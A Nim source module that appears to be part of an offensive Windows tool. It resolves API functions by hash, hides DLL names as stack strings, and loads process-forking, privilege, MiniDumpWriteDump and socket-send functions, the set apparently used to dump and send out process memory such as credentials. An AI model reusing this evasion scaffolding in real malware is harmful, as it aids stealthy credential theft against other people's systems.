import 
  std/[macros],
  winim,
  gpa, gmh, hash, stackstr

type
  NtGetNextProcess* = proc(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.stdcall.}
  NtCreateProcessEx* = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}
  
  MODULES* {.pure.} = object
    advapi32*: HMODULE
    kernel32*: HMODULE
    user32*: HMODULE
    ws2_32*: HMODULE
    wininet*: HMODULE
    ntdll*: HMODULE
    shell32*: HMODULE
    shlwapi*: HMODULE
    dbgcore*: HMODULE

  WIN32* {.pure.} = object
    # Shlwapi.dll
    PathFindFileNameA*: type(PathFindFileNameA)

    # advapi32.dll
    LookupPrivilegeValueA*: type(LookupPrivilegeValueA)
    GetTokenInformation*: type(GetTokenInformation)
    OpenProcessToken*: type(OpenProcessToken)
    AdjustTokenPrivileges*: type(AdjustTokenPrivileges)

    # KERNEL32.DLL
    CloseHandle*: type(CloseHandle)
    CreateFileW*: type(CreateFileW)
    CreateProcessA*: type(CreateProcessA)
    ExitProcess*: type(winbase.ExitProcess)
    GetModuleFileNameW*: type(GetModuleFileNameW)
    GetStdHandle*: type(GetStdHandle)
    GetLastError*: type(GetLastError)
    GetProcessHeap*: type(GetProcessHeap)
    LoadLibraryA*: type(LoadLibraryA)
    LocalAlloc*: type(LocalAlloc)
    LocalReAlloc*: type(LocalReAlloc)
    LocalFree*: type(winbase.LocalFree)
    HeapAlloc*: type(HeapAlloc)
    SetFileInformationByHandle*: type(SetFileInformationByHandle)
    Sleep*: type(winbase.Sleep)
    WriteConsoleA*: type(WriteConsoleA)
    WriteConsoleW*: type(WriteConsoleW)
    VirtualAlloc*: type(winbase.VirtualAlloc)
    VirtualAllocEx*: type(VirtualAllocEx)
    QueryFullProcessImageNameA*: type(QueryFullProcessImageNameA)
    lstrcmpiA*: type(lstrcmpiA)
    GetProcessId*: type(GetProcessId)
    CreateFileA*: type(CreateFileA)
    TerminateProcess*: type(TerminateProcess)
    GetFileSize*: type(GetFileSize)
    CreateFileMappingA*: type(CreateFileMappingA)
    MapViewOfFile*: type(MapViewOfFile)

    # USER32.DLL
    wsprintfA*: type(winuser.wsprintfA)

    # ws2_32.dll
    WSASocketA*: type(WSASocketA)
    WSAStartup*: type(WSAStartup)
    inet_addr*: type(inet_addr)
    htons*: type(htons)
    connect*: type(connect)
    send*: type(winsock.send)
    shutdown*: type(shutdown)

    # DbgCore.DLL
    MiniDumpWriteDump*: type(MiniDumpWriteDump)

    # NTDLL.DLL
    NtGetNextProcess*: NtGetNextProcess
    NtCreateProcessEx*: NtCreateProcessEx
    NtSetInformationFile*: type(NtSetInformationFile)

  NIMLESS_INSTANCE* {.pure.} = object
    Module*: MODULES
    Win32*: WIN32
    IsInitialized*: bool

#[ Global Instance ]#
# var ninst*: NIMLESS_INSTANCE

#[ Macro to initialize the function pointers ]#
proc makeCast(inst, modul, handl, class, fn: NimNode): NimNode =
  result = newNimNode(nnkCast)
  var 
    callExpr1 = newNimNode(nnkCall)
    callExpr2 = newNimNode(nnkCall)
  callExpr1.add(ident"type", newDotExpr(newDotExpr(inst, class), fn))
  callExpr2.add(ident"getProcAddressHash", 
                newDotExpr(newDotExpr(inst, modul), handl),
                newCall(
                  ident"static",
                  newCall(
                    ident"hashStrA",
                    newDotExpr(toStrLit(fn), ident"cstring")
                  )
                )
              )
  result.add(callExpr1)
  result.add(callExpr2)
  
macro getFuncPtr*(sect0, sect1): untyped =
  result = newStmtList()
  var 
    inst  = sect0[0][0]
    modul = sect0[0][1]
    handl = sect0[1]
    class = sect1[0][1]
    fn    = sect1[1]
    asgnNode = newNimNode(nnkAsgn)
    instExpr = newDotExpr(newDotExpr(inst, class), fn)
    castExpr = makeCast(inst, modul, handl, class, fn)
  asgnNode.add(instExpr)
  asgnNode.add(castExpr)
  result.add(asgnNode)

#[ Initialization Functions ]#
proc init*(ninst: var NIMLESS_INSTANCE): bool = 
  # Load Kernel32 Functions
  ninst.Module.kernel32 = gmh("kernel32")
  if ninst.Module.kernel32 != 0:
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CloseHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateFileW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateProcessA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.ExitProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetModuleFileNameW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetLastError)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessHeap)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetStdHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LoadLibraryA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalReAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalFree)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.SetFileInformationByHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.Sleep)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.WriteConsoleA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.WriteConsoleW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.VirtualAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.VirtualAllocEx)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.HeapAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessHeap)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.QueryFullProcessImageNameA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessId)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateFileA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.TerminateProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetFileSize)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateFileMappingA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.MapViewOfFile)
  else: return false

  var advapi32 {.stackStringA.} = "advapi32.dll"
  ninst.Module.advapi32 = ninst.Win32.LoadLibraryA(CPTR(advapi32))
  if ninst.Module.advapi32 != 0:
    getFuncPtr(ninst.Module.advapi32, ninst.Win32.GetTokenInformation)
    getFuncPtr(ninst.Module.advapi32, ninst.Win32.LookupPrivilegeValueA)
    getFuncPtr(ninst.Module.advapi32, ninst.Win32.OpenProcessToken)
    getFuncPtr(ninst.Module.advapi32, ninst.Win32.AdjustTokenPrivileges)

  else: return false

  # Load USER32.dll
  var user32 {.stackStringA.} = "user32.dll"
  ninst.Module.user32 = ninst.Win32.LoadLibraryA(CPTR(user32))
  if ninst.Module.user32 != 0:
    getFuncPtr(ninst.Module.user32, ninst.Win32.wsprintfA)
  else: return false

  # Load ws_32.dll
  var ws2_32 {.stackStringA.} = "ws2_32.dll"
  ninst.Module.ws2_32= ninst.Win32.LoadLibraryA(CPTR(ws2_32))
  if ninst.Module.ws2_32 != 0:
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.WSASocketA)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.WSAStartup)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.inet_addr)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.htons)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.connect)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.send)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.shutdown)
  else: return false

  # Load NTDLL.DLL
  var ntdll {.stackStringA.} = "ntdll.dll"
  ninst.Module.ntdll = ninst.Win32.LoadLibraryA(CPTR(ntdll))
  if ninst.Module.ntdll != 0:
    getFuncPtr(ninst.Module.ntdll, ninst.Win32.NtGetNextProcess)
    getFuncPtr(ninst.Module.ntdll, ninst.Win32.NtCreateProcessEx)
    getFuncPtr(ninst.Module.ntdll, ninst.Win32.NtSetInformationFile)

  else: return false

  # Load shlwapi.DLL
  var shlwapi {.stackStringA.} = "Shlwapi.dll"
  ninst.Module.shlwapi = ninst.Win32.LoadLibraryA(CPTR(shlwapi))
  if ninst.Module.shlwapi != 0:
    getFuncPtr(ninst.Module.shlwapi, ninst.Win32.PathFindFileNameA)

  else: return false  

  # Load DbgHelp.DLL
  var dbgcore {.stackStringA.} = "Dbgcore.dll"
  ninst.Module.dbgcore = ninst.Win32.LoadLibraryA(CPTR(dbgcore))
  if ninst.Module.dbgcore != 0:
    getFuncPtr(ninst.Module.dbgcore, ninst.Win32.MiniDumpWriteDump)
  else: return false  

  ninst.IsInitialized = true
  
  return true
